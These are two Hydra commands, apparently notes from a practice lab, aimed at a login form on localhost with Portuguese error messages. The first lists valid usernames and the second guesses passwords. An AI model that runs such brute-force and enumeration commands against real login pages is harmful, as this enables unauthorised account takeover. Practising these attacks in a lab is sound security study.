hydra -V -t 1  -L users.txt -p qualquer_coisa "localhost" http-form-post  "/bruteforce1/index.php:username=^USER^&password=^PASS^:Usuário inexistente"

hydra -V -t 4  -L users.txt -p passwords.txt "localhost" http-form-post  "/bruteforce1/index.php:username=^USER^&password=^PASS^:S=Senha Incorreta"

